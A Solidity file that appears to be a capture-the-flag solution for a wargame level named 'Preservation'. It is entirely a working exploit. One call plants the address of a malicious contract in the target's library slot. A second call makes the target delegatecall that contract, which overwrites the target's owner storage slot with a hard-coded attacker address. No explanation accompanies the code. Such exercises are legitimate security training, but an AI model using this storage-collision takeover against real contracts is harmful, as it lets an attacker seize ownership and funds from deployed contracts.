// SPDX-License-Identifier: MIT
pragma solidity ^0.8.*;

contract Preservation {

    address target = 0x846167eCA7658b43F42C0E992b1cEFF09f5eC8Fc;
    event TestBool(bool);
    event TestUint(uint256);

    function setup() public {

        YoinkTime attack = new YoinkTime();
        bytes memory payload = abi.encodeWithSignature("setSecondTime(uint256)", uint256(uint160(address(attack))));
        (bool success, ) = target.call(payload);
        emit TestBool(success);
    }

    function yoink() public {

        bytes memory payload = abi.encodeWithSignature("setFirstTime(uint256)", 1);
        (bool success, ) = target.call(payload);
        emit TestBool(success);
    }
}

contract YoinkTime {

    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;

    address player = 0xD64D08C68F6940281c51108734B5b5DA95f62BD5;

    function setTime(uint256 _time) public {

        owner = player;
    }

}